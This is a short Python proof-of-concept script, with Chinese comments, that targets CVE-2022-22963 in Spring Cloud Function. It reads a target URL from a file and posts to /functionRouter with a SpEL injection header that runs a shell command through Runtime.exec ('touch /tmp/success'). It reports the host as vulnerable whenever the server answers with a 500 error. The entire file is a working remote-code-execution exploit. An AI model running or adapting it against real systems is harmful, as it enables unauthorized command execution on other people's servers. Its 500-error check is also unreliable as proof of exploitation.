import json
import requests


class CVE_2022_22963:
    def __init__(self):
        with open('../opt/前端传url.txt', 'r') as file:
            self.url = file.readline()     # 获取前端传入url
        self.payload = self.url + "/functionRouter"
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/97.0.4692.71 Safari/537.36",
            "spring.cloud.function.routing-expression": "T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')",
            "Content-Type": "text/plain"
        }
        self.data = {
            "a": "test"
        }

    def g_post(self):
        try:
            res = requests.post(url=self.payload, headers=self.headers, data=self.data)
            txt = json.loads(res.text)
            if txt['status'] == 500 and txt['error'] == 'Internal Server Error':
                a = "存在CVE-2022-22963漏洞"
                print(a)
                return a
        except:
            pass


ce = CVE_2022_22963()
ce.g_post()